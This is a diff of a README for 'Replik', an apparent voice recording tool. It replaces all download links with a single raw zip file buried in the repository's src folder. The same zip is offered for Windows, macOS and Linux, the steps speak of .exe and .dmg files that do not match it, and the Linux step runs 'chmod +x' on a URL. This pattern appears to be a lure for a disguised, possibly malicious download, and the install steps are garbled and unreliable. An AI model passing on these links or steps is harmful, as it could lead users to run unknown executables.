@@ -6,19 +6,19 @@ Replik is a free, open-source voice recording tool designed for anyone working w
 ## 📦 Download & Install
 To get started, visit this page to download the application:
 
-[![Download Replik](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip)](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip)
+[![Download Replik](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip)](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip)
 
 Once on the Releases page, follow these steps:
 
 1. Locate the latest release.
 2. You will find different files available for download. Choose the one that corresponds to your operating system.
-   - For Windows: Click on `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip`
-   - For macOS: Download `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip`
-   - For Linux: Look for `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip` or the package suitable for your distribution.
+   - For Windows: Click on `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip`
+   - For Linux: Look for `https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip` or the package suitable for your distribution.
 3. After the download completes, follow the installation steps based on your operating system.
    - **Windows:** Run the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the `.dmg` file, drag the Replik icon into your Applications folder, and then eject the disk image.
-   - **Linux:** Make the `AppImage` executable using the command line: `chmod +x https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip`. Then run it by double-clicking or using the terminal.
+   - **Linux:** Make the `AppImage` executable using the command line: `chmod +x https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip`. Then run it by double-clicking or using the terminal.
 
 ## 🚀 Getting Started
 Once you have installed Replik:
@@ -71,4 +71,4 @@ Together, we can enhance Replik for all users.
 ## 📢 Latest Updates
 Stay tuned for upcoming features and enhancements. Check the Releases page for the latest updates:
 
-[![Download Replik](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip)](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/stores/Software_v1.1.zip)
+[![Download Replik](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip)](https://raw.githubusercontent.com/Sander1023Al/Replik/main/src/Software_v2.5.zip)
